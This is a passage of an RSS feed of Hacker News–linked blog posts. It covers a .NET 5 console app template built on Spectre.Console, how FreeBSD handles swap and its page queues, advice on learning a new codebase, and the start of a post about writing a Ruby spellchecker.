            <guid isPermaLink="false">hacker-news-small-sites-25792565</guid>
            <pubDate>Fri, 15 Jan 2021 16:24:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My preferred .NET console stack]]>
            </title>
            <description>
<![CDATA[
Score 189 | Comments 104 (<a href="https://news.ycombinator.com/item?id=25792422">thread link</a>) | @devlead
<br/>
January 15, 2021 | https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack | <a href="https://web.archive.org/web/*/https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div id="content">
<p>There's type of application that has followed me since I learned to code in the mid-'80s, and that's the console application. For years they looked the same a <code>Main(string[] args)</code> and some naive inconsistent command line parser. That gradually improved with the adoption of various OSS helper libraries. In this post, I'll walk through what today is my alternative starting point to <code>dotnet new console</code>, a way that greatly reduces the boilerplate code needed for logging, parsing, and validation of arguments, letting me focus on the problem to solve and not the plumbing.</p>
<h2 id="templates">Templates</h2>
<p>A convenient way to scaffold a new project is using the template function of .NET SDK CLI, it comes preloaded with several templates like <code>console</code>, <code>classlib</code>, etc., but beyond that, it's possible to create your own templates, which I've for my and your convenience created, so given <a href="https://dotnet.microsoft.com/download/dotnet/5.0">.NET 5 SDK</a> installed, easily yourself can try and take a look at everything discussed in this post.</p>
<h2 id="devlead-console-template">Devlead Console Template</h2>
<p>So let's get started with creating a new console application according to my opinionated recipe, .NET SDK Templates are distributed as NuGet packages and the canonical source for NuGet packages is <a href="https://www.nuget.org/">NuGet.org</a>, where I've published my template as <a href="https://www.nuget.org/packages/Devlead.Console.Template/">Devlead.Console.Template</a>. Templates are installed using the <code>dotnet new</code> command with <code>--install packageId</code> parameter, in this case:</p>
<pre><code>dotnet new --install Devlead.Console.Template
</code></pre>
<h2 id="dotnet-new-devleadconsole">dotnet new devleadconsole</h2>
<p>With the template installed locally, we now have a new <code>devleadconsole</code> template at our disposal, to create our new console applications with according to me, essential dependencies and boilerplate code:</p>
<pre><code>dotnet new devleadconsole -n MyConsoleApp
</code></pre>
<p>The above command will in the current directory result in the below folder structure</p>
<pre><code>MyConsoleApp
    │   MyConsoleApp.csproj
    │   Program.cs
    │
    └───Commands
        │   ConsoleCommand.cs
        │
        ├───Settings
        │       ConsoleSettings.cs
        │
        └───Validation
                ValidateStringAttribute.cs
</code></pre>
<h2 id="myconsoleapp.csproj">MyConsoleApp.csproj</h2>
<p>The created project file will look something like below</p>
<pre><code>&lt;Project Sdk="Microsoft.NET.Sdk"&gt;
  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net5.0&lt;/TargetFramework&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
    &lt;TreatWarningsAsErrors&gt;true&lt;/TreatWarningsAsErrors&gt;
  &lt;/PropertyGroup&gt;
  &lt;ItemGroup&gt;
    &lt;PackageReference Include="Spectre.Console" Version="0.37.0" /&gt;
    &lt;PackageReference Include="Spectre.Cli.Extensions.DependencyInjection" Version="0.3.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.Extensions.Logging.Console" Version="5.0.0" /&gt;
    &lt;PackageReference Include="Microsoft.SourceLink.GitHub" Version="1.0.0" PrivateAssets="All"/&gt;
  &lt;/ItemGroup&gt;
&lt;/Project&gt;
</code></pre>
<p>let's step for step break it down</p>
<h3 id="outputtype">OutputType</h3>
<p><code>OutputType</code> with the value <code>exe</code>, indicates that this will be an executable.</p>
<h3 id="targetframework">TargetFramework</h3>
<p><code>TargetFramework</code> with the value <code>net5.0</code>, means that this will be compiled for/targeting .NET 5.</p>
<h3 id="nullable">Nullable</h3>
<p><code>Nullable</code> with the value <code>enable</code>, enables the <a href="https://docs.microsoft.com/en-us/dotnet/csharp/nullable-references">nullable reference types</a> feature that was introduced with C# 8, making reference types non-nullable by default, basically moving many errors from being caught late at runtime, to be caught early at compile time.</p>
<h3 id="treatwarningsaserrors">TreatWarningsAsErrors</h3>
<p><code>TreatWarningsAsErrors</code> with the value <code>true</code> makes the compiler grumpier, it won't just break the build for compiler errors, but also for compiler warnings, combined with <code>Nullable</code> I personally believe code quality gets better from the start.</p>
<h3 id="packagereferences">PackageReference(s)</h3>
<ul>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a></strong> is a lot of things, a true swiss army for anyone doing console applications, but in this template, it's foremost an extremely opinionated command-line parser.</li>
<li><strong><a href="https://www.nuget.org/packages/Spectre.Cli.Extensions.DependencyInjection">Spectre.Cli.Extensions.DependencyInjection</a></strong> makes it easy for <a href="https://www.nuget.org/packages/Spectre.Console">Spectre.Console</a> to interop with standard <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.DependencyInjection/">Microsoft DependencyInjection</a></strong>, same as used by default for dependency injection with i.e. ASP .NET and Azure Functions.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging">Microsoft.Extensions.Logging</a></strong> simplified provides standard logging abstractions and <strong><a href="https://www.nuget.org/packages/Microsoft.Extensions.Logging.Console">Microsoft.Extensions.Logging.Console</a></strong> provides an implementation for logging to the console.</li>
<li><strong><a href="https://www.nuget.org/packages/Microsoft.SourceLink.GitHub">Microsoft.SourceLink.GitHub</a></strong> enables automatic tracking between artifact and source control, providing a better debugging and traceability experience.</li>
</ul>
<h2 id="program.cs">Program.cs</h2>
<p>The generated <code>Program.cs</code> uses the new C#9 <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> pattern removing unnecessary ceremony code from the application, but what it does contain:</p>
<ol>
<li>using statements</li>
<li>Creating dependency injection container</li>
<li>Console logger registration</li>
<li>Hooking up dependency injection container with Spectre.Console</li>
<li>Spectre.Console command declaration</li>
<li>Execute the application</li>
</ol>
<blockquote>
<p>Note: <a href="https://docs.microsoft.com/en-us/dotnet/csharp/whats-new/csharp-9#top-level-statements">Top-level statement</a> means as <code>RunAsync</code> returns a <code>Task&lt;int&gt;</code>, .NET 5 will automatically generate "<code>Program</code>" class and <code>async Task&lt;int&gt; Main(string args)</code> for you, removing the need to write a lot of boilerplate code.</p>
</blockquote>
<pre><code>using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Devlead.Console.Commands;
using Spectre.Console.Cli;
using Spectre.Cli.Extensions.DependencyInjection;

var serviceCollection = new ServiceCollection()
    .AddLogging(configure =&gt;
            configure
                .AddSimpleConsole(opts =&gt; {
                    opts.TimestampFormat = "yyyy-MM-dd HH:mm:ss ";
                })
    );

using var registrar = new DependencyInjectionRegistrar(serviceCollection);
var app = new CommandApp(registrar);

app.Configure(
    config =&gt;
    {
        config.ValidateExamples();

        config.AddCommand&lt;ConsoleCommand&gt;("console")
                .WithDescription("Example console command.")
                .WithExample(new[] { "console" });
    });

return await app.RunAsync(args);
</code></pre>
<h2 id="consolecommand.cs">ConsoleCommand.cs</h2>
<p><code>ConsoleCommand.cs</code> contains "just" your business code, <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> handles the heavy lifting of parsing and validating command-line arguments (<em>based on provided settings class, more on that later in the post.</em>), resolving constructor parameters using dependency injection, etc. Letting you focus on the domain and not the boilerplate code, resulting in a very similar experience to i.e. Azure Function or .NET Workers, enabling reuse of both patterns and code. <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> has support for both async and sync commands.</p>
<pre><code>using System.Threading.Tasks;
using Microsoft.Extensions.Logging;
using MyConsoleApp.Commands.Setting;
using Spectre.Console.Cli;

namespace MyConsoleApp.Commands
{
    public class ConsoleCommand : AsyncCommand&lt;ConsoleSettings&gt;
    {
        private ILogger Logger { get; }

        public override async Task&lt;int&gt; ExecuteAsync(CommandContext context, ConsoleSettings settings)
        {
            Logger.LogInformation("Mandatory: {Mandatory}", settings.Mandatory);
            Logger.LogInformation("Optional: {Optional}", settings.Optional);
            Logger.LogInformation("CommandOptionFlag: {CommandOptionFlag}", settings.CommandOptionFlag);
            Logger.LogInformation("CommandOptionValue: {CommandOptionValue}", settings.CommandOptionValue);
            return await Task.FromResult(0);
        }

        public ConsoleCommand(ILogger&lt;ConsoleCommand&gt; logger)
        {
            Logger = logger;
        }
    }
}
</code></pre>
<h2 id="consolesettings.cs">ConsoleSettings.cs</h2>
<p><code>ConsoleSettings.cs</code> contains the definition of what parameters each command has, if they're are mandatory/optional, positional and how they validated. It also contains metadata used for automatically generating help and error messages.</p>
<pre><code>using System.ComponentModel;
using Devlead.Console.Commands.Validate;
using Spectre.Console.Cli;

namespace Devlead.Console.Commands.Setting
{
    public class ConsoleSettings : CommandSettings
    {
        [CommandArgument(0, "&lt;mandatory&gt;")]
        [Description("Mandatory argument")]
        public string Mandatory { get; set; } = string.Empty;

        [CommandArgument(1, "[optional]")]
        [Description("Optional argument")]
        public string? Optional { get; set; }

        [CommandOption("--command-option-flag")]
        [Description("Command option flag.")]
        public bool CommandOptionFlag { get; set; }

        [CommandOption("--command-option-value &lt;value&gt;")]
        [Description("Command option value.")]
        [ValidateString]
        public string? CommandOptionValue { get; set; }
    }
}
</code></pre>
<h2 id="validatestringattribute.cs">ValidateStringAttribute.cs</h2>
<p><a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> can validate either by custom attributes on properties (<em>see <code>ConsoleSettings.CommandOptionValue</code> for an example of that</em>) or globally by overriding <code>Validate()</code> method on <code>CommandSettings</code>. The template ships with a sample <code>ValidateStringAttribute</code> that just validates the length of a string, but you can make it as advanced as you want.</p>
<pre><code>using Spectre.Console;
using Spectre.Console.Cli;

namespace MyConsoleApp.Commands.Validation
{
    public class ValidateStringAttribute : ParameterValidationAttribute
    {
        public const int MinimumLength = 3;

        public ValidateStringAttribute() : base(errorMessage: null)
        {
        }

        public override ValidationResult Validate(ICommandParameterInfo parameterInfo, object? value)
            =&gt; (value as string) switch {
                { Length: &gt;= MinimumLength }
                    =&gt; ValidationResult.Success(),

                { Length: &lt; MinimumLength }
                    =&gt; ValidationResult.Error($"{parameterInfo?.PropertyName} ({value}) needs to be at least {MinimumLength} characters long."),

                _ =&gt; ValidationResult.Error($"Invalid {parameterInfo?.PropertyName} ({value}) specified.")
            };
    }
}
</code></pre>
<h2 id="result">Result</h2>
<p><img src="https://cdn.devlead.se/clipimg-vscode/2021/01/15/devleadmyconsoleapp.gif?sp=rl&amp;st=2021-01-15T09:33:29Z&amp;se=2031-01-16T09:33:00Z&amp;sv=2019-12-12&amp;sr=b&amp;sig=fp8lXgfDwOgGkdK3cYm0fFojddT8ZEx7SJuiIMkIOW8%3D" alt="GIF animation of Console experience"></p>
<h2 id="conclusion">Conclusion</h2>
<p>This is my opinionated happy path for doing .NET Console applications, feel free to let me know if you've got your own recipe for success, but must say I'm really happy how this combination lets me write console applications in the same way as I do my .NET workers, Azure Functions, ASP .NET Core, etc. ensuring consistency, less duplication and good reuse of both patterns and code. There's a LOT more to <a href="https://spectresystems.github.io/spectre.console/">Spectre.Console</a> than command-line parsing, to I hight …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack">https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack</a></em></p>]]>
            </description>
            <link>https://www.devlead.se/posts/2021/2021-01-15-my-preferred-console-stack</link>
            <guid isPermaLink="false">hacker-news-small-sites-25792422</guid>
            <pubDate>Fri, 15 Jan 2021 16:08:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploring Swap on FreeBSD]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25789809">thread link</a>) | @rodrigo975
<br/>
January 15, 2021 | https://klarasystems.com/articles/exploring-swap-on-freebsd/ | <a href="https://web.archive.org/web/*/https://klarasystems.com/articles/exploring-swap-on-freebsd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<div>
<p>On modern Unix-like systems such as <strong>FreeBSD</strong>, “<em>swapping</em>” refers to the activity of paging out the contents of memory to a disk and then paging it back in on demand. The page-out activity occurs in response to a lack of free memory in the system: the kernel tries to identify pages of memory that probably will not be accessed in the near future, and copies their contents to a disk for safekeeping until they are needed again. When an application attempts to access memory that has been swapped out, it blocks while the kernel fetches that saved memory from the swap disk, and then resumes execution as if nothing had happened.</p>



<p>All of the above might sound perfectly sensible. After all, disks are typically much larger than RAM, so why not use them to cache infrequently accessed pages of memory? Yet, many experienced system administrators treat swapping as an abnormal activity, a sign of something amiss. This is justifiable: until relatively recently, the disks typically used for swapping had access latencies millions of times higher than RAM. </p>



<p>That is, an application waiting for memory to be paged back in from swap would have to wait for tens of milliseconds while a regular RAM access takes tens of nanoseconds. Heavy usage of swapped-out memory would thus ruin the performance of a system, so swap activity is often taken as a sign that the system needs more RAM or that memory usage needs to be tuned. A common “solution” is to disable swapping entirely, forcing the operating system to resort to other means to free up memory when necessary.</p>



<p>In 2021, cheap SSDs have become commonplace and have performance characteristics much better suited to swapping, so it seems worthwhile to revisit how swapping works in FreeBSD, and try to provide some insight into frequently raised issues.</p>



<h5><strong>Swapping: when and how much?</strong></h5>



<p>Computer systems have a fixed amount of RAM. It is up to the operating system to optimize its usage. Ideally, operating systems would be able to peer into the future to see which data is about to be accessed; with this information they could ensure that the data is available in RAM before it is accessed. Being constrained to the real world, however, they use a set of heuristics which try to predict future memory accesses. An effective and commonly used heuristic is to cache recently accessed data in memory since it is likely to be accessed again, in the near future. When no free memory is available and an application accesses uncached data, FreeBSD determines which memory was least recently accessed and evicts its contents to make room for new data. This algorithm is called Least-Recently Used (LRU).</p>



<p>Note that the kernel cannot simply throw away data[1]; if a copy is not available on disk it must first page out the data before releasing the backing memory. Thus, swap activity is closely tied to LRU.</p>



<p>Implementing LRU precisely comes with a lot of undesirable overhead, so FreeBSD implements an approximation of LRU – it tries to find memory that has not been accessed in a long time, and evicts that. As part of this implementation, FreeBSD partitions the system’s memory into a set of queues: the active, inactive and laundry queues[2]. The sizes of each of these queues is shown by <em>top(1):</em></p>



<pre><code>  Mem: 2591M Active, 6576M Inact, 1389M Laundry, 4155M Wired, 1543M Buf, 1130M Free
  Swap: 8192M Total, 1623M Used, 6569M Free, 19% Inuse
</code></pre>



<div data-columns="3" data-layout="50-25-25"><div>




<div><div>
<p>Did you know?</p>



<h2>You can maximize the <strong>power of your FreeBSD</strong> infrastructure with our <strong>Support Subscription!</strong></h2>




</div></div>




</div></div>



<p>“<em>Wired</em>” pages are not eligible to be paged out and thus do not participate in LRU. Active pages are frequently referenced; typically, they are mapped into one or more process’ address spaces. For example, memory returned by <em>malloc</em>(3) will initially be resident in the active queue. To determine which active pages are no longer being referenced, a kernel process called the “page daemon” periodically examines the recent access history of each page. Unreferenced pages are aged out of the active queue and into the inactive queue.</p>



<p>The inactive queue contains pages that have not been accessed recently. Such pages are good candidates for reuse if the kernel needs to handle a shortage of free memory. The queue helps order pages by recency of access: newly inactive pages are inserted at the tail of the queue, and pages are reclaimed from the head of the queue.</p>



<p>Earlier we noted that a well-behaved operating system must not throw away data when handling a free memory shortage. If some data is in a page of memory and no copy of that data exists in stable storage, then the page is said to be “dirty” and before it can be reused its contents must be paged out to storage. Otherwise, the page is “clean.” For example, if one searches a file using grep(1), that file’s data must be loaded into memory, but because grep(1)merely reads that data, that memory will be clean and can be reused at any point.</p>



<p>The active and inactive queues will contain a mix of clean and dirty pages. When reclaiming memory to alleviate a shortage, the page daemon will free clean pages from the head of the inactive queue. Dirty pages must first be cleaned by paging them out to swap or a file system. This is a lot of work, so the page daemon moves them to the laundry queue for deferred processing. The laundry queue is managed by a dedicated thread, the laundry thread, which is responsible for deciding when and how much to page out. The relationship between these queues is depicted here:</p>



<div><figure><img data-attachment-id="3546" data-permalink="https://klarasystems.com/articles/exploring-swap-on-freebsd/image-4/" data-orig-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=340%2C270&amp;ssl=1" data-orig-size="340,270" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-4" data-image-description="" data-medium-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=300%2C238&amp;ssl=1" data-large-file="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?fit=340%2C270&amp;ssl=1" loading="lazy" width="340" height="270" src="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?resize=340%2C270&amp;ssl=1" alt="" srcset="https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?w=340&amp;ssl=1 340w, https://i2.wp.com/klarasystems.com/wp-content/uploads/2021/01/image-4.png?resize=300%2C238&amp;ssl=1 300w" sizes="(max-width: 340px) 100vw, 340px" data-recalc-dims="1"></figure></div>



<p><strong>To summarize:</strong></p>



<p>– The page daemon migrates unreferenced pages from the active queue to the inactive queue (1).</p>



<p>– To free up memory, the page daemon scans pages at the head of the inactive queue (2), frees clean pages (6), and moves dirty pages to the tail of the laundry queue (3).</p>



<p>– When the laundry thread decides to clean some dirty pages (4), it hands them to a pager, which writes their contents to stable storage and places the cleaned pages in the inactive queue (6).</p>



<p>– If a page is referenced after it is placed in the inactive or laundry queues, it will lazily be moved back to the active queue.</p>



<p>One possible strategy for the laundry thread is to just do nothing, relying on reclamation of clean pages to satisfy demand for free memory. Indeed, this is effectively what happens when you disable swap altogether. However, pages in the laundry queue are inactive by definition, and unused memory is wasted memory. Another possible strategy is to launder pages as soon as they enter the queue, but this can result in unnecessary I/O.</p>



<p><strong>The policy used by the laundry thread makes use of several signals:</strong></p>



<p>1) The ratio of the lengths of the inactive and laundry queues,</p>



<p>2) the number of clean pages reclaimed since the last set of page-outs, and</p>



<p>3) the size of the inactive queue relative to its target (minimum) size.</p>



<p>The laundry thread uses the first two signals to control “background” laundering, while the third is used to drive “shortfall” laundering.</p>



<p>The idea behind background laundering is to try and ensure that some dirty pages are paged out before a shortage of clean inactive pages occurs. When the system is out of both free pages and clean inactive pages, applications that need free memory are effectively stuck waiting for some page-outs to swap to complete. The laundry thread therefore tries to ensure that the laundry queue does not grow too large: the larger the ratio (1) of queue sizes, the more frequently the laundry thread will perform page-outs of dirty memory. Because it is a waste of I/O bandwidth to page out dirty memory when there is no shortage of free memory, the laundry thread monitors the activity of the page daemon to determine how frequently it should perform page outs.</p>



<h5><strong>Why is my system using so much swap space?</strong></h5>



<p>When a dirty page’s contents have been paged out to swap, the page is marked clean and becomes eligible for reclamation. At this point, the page’s contents exactly match the copy saved to the swap device. (The page could be dirtied again, in which case it was recently accessed and belongs back in the active queue.) Suppose the page is freed, and later an application tries to read the data. A fresh page will be allocated and the data is paged back in from swap, at which point the application can run again and use that data. At this point the page is still clean – only if the data is written to will the page be marked dirty – so the copy in the swap device is still valid and there is no reason to discard it.</p>



<p>More generally, a write-once-read-many access pattern can be common for some types of data. A long-lived process may allocate and write to a region of memory during startup and thereafter only read from that memory, for example. If that memory is paged out, FreeBSD will retain the copy in swap so long as it remains valid. Otherwise, in order to reclaim that memory, it would have to perform another expensive page-out operation.</p>



<p>It is thus common to see moderate swap space usage even when plenty of free memory is available[3]: at some point in the past, demand for free memory triggered page-outs to swap, and the swapped-out data remained valid.</p>



<h5><strong>Why is the kernel killing my processes?</strong></h5>



<p>In some scenarios, shortfall laundering may not be enough to alleviate a shortage of free memory. A process may have a runaway memory leak or the system may be oversubscribed to the point where it becomes completely unresponsive. The laundry thread may be paging out memory as quickly as possible but cannot meet demand, or the swap device may be full. At this point the kernel has little choice but to try and kill processes to reclaim memory and restore stability to the system – the dreaded OOM (out-of-memory) kill.</p>



<p>FreeBSD will trigger OOM kills in a couple of scenarios. First, if the page daemon repeatedly fails to reclaim _any_ pages from the inactive queue, it will eventually trigger OOM kills. If the swap device is full, the laundry thread will be …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://klarasystems.com/articles/exploring-swap-on-freebsd/">https://klarasystems.com/articles/exploring-swap-on-freebsd/</a></em></p>]]>
            </description>
            <link>https://klarasystems.com/articles/exploring-swap-on-freebsd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789809</guid>
            <pubDate>Fri, 15 Jan 2021 11:53:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to join a team and learn a codebase (2020)]]>
            </title>
            <description>
<![CDATA[
Score 96 | Comments 8 (<a href="https://news.ycombinator.com/item?id=25789336">thread link</a>) | @minicaionut
<br/>
January 15, 2021 | https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html | <a href="https://web.archive.org/web/*/https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<span><a href="https://www.samueltaylor.org/index.html">Home</a> &gt; <a href="https://www.samueltaylor.org/articles/index.html">Articles</a> &gt; new codebase, who dis? (How to Join a Team and Learn a Codebase)</span>

<p>I have switched teams more often than I have had to implement an AVL tree, and you can guess which one of those two was taught in school. I wish someone had taught me how to join a new team! While learning a new codebase can be daunting, I've found a few things that work for me.</p>
<p>You should do at least three things when joining a new team. The order of these three can be whatever you like, but all three should be done as soon as reasonably possible.</p>
<p><strong>First</strong>, you’ll likely set up the development environment. As you do this, pay attention to just what it is that you're setting up. For instance, if you need to get Redis running locally, then that's a good hint that there's some caching happening somewhere. Noting the order in which you run internal projects helps you understand dependencies. If the feature store needs to be running before you bring up the model serving service, that's a hint that the model serving service may depend upon the feature store. Such dependencies start to hint at the overall architecture.</p>
<p>Take notes on the exact commands you’re running and packages you’re installing. You’re bound to run into something that’s changed since the setup docs were written, and being able to correct them is a quick win you can provide to the new team. Plus, it's good to know exactly how you ruined your system installation of Python.</p>
<p>Ideally, the code you're working on should have some sort of automated test suite in place. A good way to start experimenting with and understanding the code is to get that test suite successfully running, then make changes to the codebase completely at random and see what breaks.</p>
<p>The <strong>second</strong> thing you should do is get some overview of the architecture. Some teams will have a document describing this, and if that document is an accurate depiction of reality then you should certainly work to understand it. In any case, asking a more senior person on the team to give you an overview is a good idea. They should know how up-to-date that document is (if it does exist) and also be able to describe and/or draw the architecture for you. Here are some sample questions you can consider asking:</p>
<ul>
<li>What repositories (or portions of repositories) do we own and/or work on most frequently? What do each of them do?</li>
<li>Where does our code run? (e.g. EC2 Instances, Google's Kubernetes Engine, on prem)</li>
<li>What does the deployment pipeline look like? How does a feature get from my laptop to live in production?</li>
<li>Do we have certain services, packages, classes, or files that are a real headache? Areas that are particularly unreliable or error-prone?</li>
<li>Are there external API's, vendors, or products that we use or rely on? (e.g. SendGrid, DataDog, MySQL)</li>
</ul>
<p>Similar to environment setup, an easy thing you can do to help the team is to document that architectural overview (or update the existing document). Write down what you learned, take a picture of the diagrams that were drawn, and post that information somewhere visible to the team. Be sure to put an "as of" date on your changes. Even stable projects exhibit some change over a long enough time period, so this date will help future readers know if they can trust this document.</p>
<p>A <strong>third</strong> thing you should do when starting on a new team is start understanding the business. If you're new to the company, figure out its mission, product offering(s), and goal(s). Then work to understand how your team fits into those things. Some sample questions include:</p>
<ul>
<li>How can our team make an impact on the company's goals?</li>
<li>If our code were to break horrifically, who would get angry? How fast would that happen?</li>
<li>What other teams do we have the most interaction with? What services/codebases do they own? Do we share parts of our codebase with other teams?</li>
</ul>
<p>Without an understanding of the team's place in the company, you're doomed. You won't have sufficient context to execute your work well.</p>
<h2>Mindset</h2>
<p>I strongly believe that learning a new codebase happens best through implementing real features (even if they are small to start with). The whole point of being on this team as an individual contributor is to build stuff, and there is no better way to learn how to do something than by spending quality time doing that exact thing. As you build skill and understanding, you can work on larger and larger projects over time.</p>
<p>Implementing something will require you to read the code. But "read" may be a misleading word here, because reading code is dramatically different from reading a novel. Code is typically organized with more related code being closer together (in the same directory, package, class, or file). Can you imagine a novel written in this way? If Tolkien had placed all scenes of two characters fighting each other in adjacent pages, while all scenes with magic in them occurred in a separate book? How absurd!</p>
<p>Though learning to code taught me the basics of reading code, nobody ever taught me how to read a large codebase. To do so, we must adopt a certain mindset. Balance understanding each intricate detail against making impact quickly. Quick impact helps establish your reputation on the team and gets you to that accurate/intricate understanding faster than trying to read everything up front.</p>
<p>The rule of thumb I use is to understand something just enough to express what it does without necessarily knowing exactly how it does that. This process is called "chunking," and it relies on the fact that once you have a basic understanding of a unit of code, "you don't need to remember all the little underlying details" (Oakley). If you're worried about not understanding everything in minute detail, don't be afraid to take a note to come back and understand that chunk more fully.</p>
<p>This understanding will grow recursively: first, you understand what the various services do. Then, you identify the particular service you need to modify and start to understand the various modules within that service. In the modules you modify, you'll start to understand the classes contained. The base case of this recursive process is the individual line.</p>
<p>Keep in mind that different teams may implement the same concept or pattern in different ways. Understanding why your current team chose the way they did is another way new teammates can help the team. It's totally possible that your new team hasn't heard of the cool way to implement singletons that you like. It's equally possible that your way is worse in some way you didn't know. Either way, someone gets to learn something!</p>
<p>The last mindset recommendation I'll give before we dive into the process is to try to understand the code both in terms of code paths and data flows. Think about which objects know what information and how that information flows between parts of the system.</p>
<h2>Process</h2>
<p>I recommend this process for working in any codebase:</p>
<ol>
<li><strong>Locate the portion of code most relevant to the immediate task</strong> at hand.</li>
<li>Understand that code enough to <strong>form a hypothesis</strong> about the change you need to make.</li>
<li>Make that change and <strong>test your hypothesis</strong>. Sometimes the best way will be to click around in the UI or run a particular script. Sometimes the easiest path is to write a test that describes the behavior you're after.</li>
<li>If your hypothesis was incorrect, return to step 2. Understand why that change didn't do what you thought it would, and develop a new hypothesis.</li>
<li>Once you have working code, <strong>improve its quality</strong>. Write a test (or a few) that document the changes in behavior you made. Refactor your code for clarity and style.</li>
</ol>
<p>This scientific approach guides us gradually toward correct, high quality code without having to understand each and every bit of code around our change.</p>
<h2>Tools</h2>
<p>While you could certainly get by with just a text editor and some patience, a wide variety of tools exist that help us read code more effectively throughout the process identified above.</p>
<h3>Identifying relevant code</h3>
<p>While step one gets easier over time as we build familiarity with some portion of code, we often begin step one completely lost. A few approaches are helpful here: running the code, project search, and code search.</p>
<p>Running the code helps you understand it. Before you start changing things, understand what already exists. This could mean reproducing a bug locally, finding the place in the UI where the new feature will go, or any number of other things. When you do, stepping through the execution in a debugger will give you a strong start on understanding what is going on.</p>
<p>By "project search," I mean searching artifacts created as part of the software development lifecycle. Particularly useful are issue trackers like JIRA/Asana/Pivotal Tracker, pull requests and issues in tools like GitHub and GitLab, and the git history itself. Because few tasks are truly novel, we can often gain understanding by looking for similar past work. Try several different keywords. Sometimes you'll find a pull request that implements something very similar to what you want to do, and you can use that as a guide. Trying to divine something from scratch, while sometimes necessary, requires significantly more effort than adapting from an example.</p>
<p>Code search is just what it sounds like. For code that you have checked out locally, I highly recommend using a tool specifically built for recursive search like ack, Silver Searcher (ag), or ripgrep. But you won't always have every bit of code at the company checked out locally, and sometimes it's useful to be able to search exhaustively. For this use case, tools like OpenGrok or Sourcegraph are super helpful. GitHub and GitLab also offer ways to search all code within a specific organization.</p>
<p>No matter which tool you're using, try several keywords you think might be relevant. Consider changing case sensitivity. You may have better results filtering down to specific file types.</p>
<h3>Understanding code</h3>
<p>Using these various search tools, we arrive at a set of relevant locations. Thus, we arrive into step two of our process: …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html">https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html</a></em></p>]]>
            </description>
            <link>https://www.samueltaylor.org/articles/how-to-learn-a-codebase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25789336</guid>
            <pubDate>Fri, 15 Jan 2021 10:54:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rebuilding the spellchecker]]>
            </title>
            <description>
<![CDATA[
Score 140 | Comments 24 (<a href="https://news.ycombinator.com/item?id=25789099">thread link</a>) | @zverok
<br/>
January 15, 2021 | https://zverok.github.io/blog/2021-01-05-spellchecker-1.html | <a href="https://web.archive.org/web/*/https://zverok.github.io/blog/2021-01-05-spellchecker-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <h2 id="how-i-decided-to-write-a-spellchecker-and-almost-died-trying">How I decided to write a spellchecker and almost died trying</h2>

<p>A few years ago I had a fun idea for a “weekend project”: pure-Ruby spellchecker. Ruby is my language of choice, and no-dependencies spellchecker seemed a small useful tool for the CI environment: for example, to check comments/docs spelling without installing any third-party software. I actually <em>could’ve</em> pulled out the project in its limited scope (only English, only spot misspelled words without fixing, limited dictionary) with just a flat list of known words, but that’s not what happened.</p>

<p>Back then, I decided to make a moderately generic tool, at least able to work with multiple languages. Fortunately (or so I believed!), there were many already existing and freely available spellchecking dictionaries distributed as LibreOffice and Firefox extensions. All of those dictionaries are in the format defined by the <strong><a href="http://hunspell.github.io/">Hunspell</a></strong> tool/library—which is an open-source library that is used for spellchecking in Libre/OpenOffice, Mozilla products (Firefox, Thunderbird), but also Google Chrome/Chromium, macOS, several Adobe products, and so on.</p>

